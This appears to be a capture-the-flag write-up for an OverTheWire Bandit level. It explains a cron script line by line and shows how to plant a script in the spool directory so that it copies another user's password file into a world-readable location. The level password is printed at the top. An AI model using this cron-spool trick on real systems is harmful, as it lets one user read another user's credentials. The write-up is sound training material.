Level password: `0Zf11ioIjMVN551jX3CmStKLYqjk54Ga`

Same first step as the last 2 levels. But the bandit24 crontab script is different:

```sh
cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

```sh
for i in * .*;
```

This loops over each file within the current directory.

```sh
if [ "$i" != "." -a "$i" != ".." ];
```

This skips over files that's named `.` or `..`, which are important directories.

```sh
owner="$(stat --format "%U" ./$i)"
```

This gets the owner of the file to be executed name.

```sh
stat --format "%U" ./$i
```

`stat` displays the file status, `--format "%U"` allows outputting the specified format instead of the default.

```sh
if [ "${owner}" = "bandit23" ]; then
	timeout -s 9 60 ./$i
fi
```

This checks whether the owner of the file is `bandit23`. If it is then it executes it. But it will timeout after 60 seconds. When it timeout, it sends a signal `9` to the process. The 9th signal is the `kill` signal (use `kill -l` to list the signals. Signal `9` is the `KILL` signal).

```sh
rm -f ./$i
```

This force delete the current file being processed.

What we can extract from this script is that this crontab executes any files in the `/var/spool/current_username/foo/` and delete it. Specifically, for files that is owned by user *bandit23* (aka us), it would run the executable for 60 seconds then kill it. This means the script would run with the permissions of user *bandit24*. So we could create our own script and to read the password of bandit24 and write it into a file that we could access:

```sh
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/temp_dir/password.txt
```

Before we could do anything, we need to modify the permission so that the crontab could access the directory that houses the password file, the password file itself, and the permission of the script itself:

```sh
chmod +rx script.sh
chmod +rwx /tmp/temp_dir
chmod +rw password.txt
```

Then we copy the script to the `/var/spool/bandit24/foo/` directory and wait for it to execute:

```sh
cp script.sh /var/spool/bandit24/foo/
```